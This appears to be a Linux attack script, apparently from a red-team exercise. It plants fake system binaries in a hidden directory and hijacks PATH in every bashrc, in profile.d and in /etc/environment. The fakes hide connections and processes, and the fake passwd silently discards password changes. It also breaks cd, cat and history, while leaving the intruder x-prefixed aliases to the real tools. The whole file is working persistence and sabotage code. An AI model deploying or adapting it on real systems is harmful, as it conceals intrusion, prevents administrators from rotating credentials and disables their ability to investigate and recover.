#!/bin/bash
# chaos_shadow.sh

SHADOW_DIR="/var/lib/.cache"
mkdir -p "$SHADOW_DIR"

# --- sudo ---
cat > "$SHADOW_DIR/sudo" << 'EOF'
#!/bin/bash
echo "wubby7 x100"
exit 1
EOF

# --- ps ---
cat > "$SHADOW_DIR/ps" << 'EOF'
#!/bin/bash
echo "wubby7"
exit 0
EOF

# --- netstat ---
cat > "$SHADOW_DIR/netstat" << 'EOF'
#!/bin/bash
echo "Active Internet connections (w/o servers)"
echo "Proto Recv-Q Send-Q Local Address           Foreign Address         State"
exit 0
EOF

# --- ss ---
cat > "$SHADOW_DIR/ss" << 'EOF'
#!/bin/bash
echo "Netid  State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port"
exit 0
EOF

# --- grep ---
cat > "$SHADOW_DIR/grep" << 'EOF'
#!/bin/bash
exit 1
EOF

# --- find ---
cat > "$SHADOW_DIR/find" << 'EOF'
#!/bin/bash
exit 0
EOF

# --- nano ---
cat > "$SHADOW_DIR/nano" << 'EOF'
#!/bin/bash
TMPFILE=$(mktemp)
/usr/bin/nano "$@" "$TMPFILE"
rm -f "$TMPFILE"
exit 0
EOF

# --- vim ---
cat > "$SHADOW_DIR/vim" << 'EOF'
#!/bin/bash
TMPFILE=$(mktemp)
/usr/bin/vim "$@" "$TMPFILE"
rm -f "$TMPFILE"
exit 0
EOF

# --- whoami ---
cat > "$SHADOW_DIR/whoami" << 'EOF'
#!/bin/bash
echo "definitely_not_hacked"
EOF

# --- hostname ---
cat > "$SHADOW_DIR/hostname" << 'EOF'
#!/bin/bash
echo "wubby7.local"
EOF

# --- passwd ---
cat > "$SHADOW_DIR/passwd" << 'EOF'
#!/bin/bash
echo "Enter new password: "
read -s _
echo "Retype new password: "
read -s _
echo "passwd: password updated successfully"
exit 0
EOF

# --- systemctl ---
cat > "$SHADOW_DIR/systemctl" << 'EOF'
#!/bin/bash
echo "wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7"
exit 1
EOF

chmod +x "$SHADOW_DIR"/*

# resolve real binary paths on this machine
PS_PATH=$(command -v ps 2>/dev/null || echo "/usr/bin/ps")
SS_PATH=$(command -v ss 2>/dev/null || echo "/usr/sbin/ss")
NETSTAT_PATH=$(command -v netstat 2>/dev/null || echo "/usr/bin/netstat")
NANO_PATH=$(command -v nano 2>/dev/null || echo "/usr/bin/nano")
VIM_PATH=$(command -v vim 2>/dev/null || echo "/usr/bin/vim")
GREP_PATH=$(command -v grep 2>/dev/null || echo "/usr/bin/grep")
FIND_PATH=$(command -v find 2>/dev/null || echo "/usr/bin/find")
SUDO_PATH=$(command -v sudo 2>/dev/null || echo "/usr/bin/sudo")
WHOAMI_PATH=$(command -v whoami 2>/dev/null || echo "/usr/bin/whoami")
HOSTNAME_PATH=$(command -v hostname 2>/dev/null || echo "/usr/bin/hostname")
PASSWD_PATH=$(command -v passwd 2>/dev/null || echo "/usr/bin/passwd")
SYSTEMCTL_PATH=$(command -v systemctl 2>/dev/null || echo "/usr/bin/systemctl")

ALIASES="
alias xudo=\"$SUDO_PATH\"
alias xps=\"$PS_PATH\"
alias xetstat=\"$NETSTAT_PATH\"
alias xss=\"$SS_PATH\"
alias xrep=\"$GREP_PATH\"
alias xind=\"$FIND_PATH\"
alias xano=\"$NANO_PATH\"
alias xim=\"$VIM_PATH\"
alias xhoami=\"$WHOAMI_PATH\"
alias xostname=\"$HOSTNAME_PATH\"
alias xasswd=\"$PASSWD_PATH\"
alias xystemctl=\"$SYSTEMCTL_PATH\"
"

FUNCTIONS='
cd() {
    echo "wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7"
    return 1
}
cat() {
    echo "wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7"
    return 1
}
history() {
    return 0
}
xd() { builtin cd "$@"; }
xat() { /usr/bin/cat "$@"; }
xistory() { builtin history "$@"; }
'

PATH_INJECT="export PATH=\"$SHADOW_DIR:\$PATH\""

# write to all bashrc locations
for f in /etc/bash.bashrc /root/.bashrc; do
    echo "$ALIASES"      >> "$f"
    echo "$FUNCTIONS"    >> "$f"
    echo "$PATH_INJECT"  >> "$f"
done

for user_home in /home/*; do
    if [ -f "$user_home/.bashrc" ]; then
        echo "$ALIASES"      >> "$user_home/.bashrc"
        echo "$FUNCTIONS"    >> "$user_home/.bashrc"
        echo "$PATH_INJECT"  >> "$user_home/.bashrc"
    fi
done

# profile.d catches login shells and covers Rocky/RHEL where bash.bashrc isn't sourced
cat > /etc/profile.d/wubby.sh << WUBEOF
$ALIASES
$FUNCTIONS
$PATH_INJECT
WUBEOF
chmod +x /etc/profile.d/wubby.sh

# non-interactive shells via /etc/environment
sed -i "s|PATH=\"|PATH=\"$SHADOW_DIR:|" /etc/environment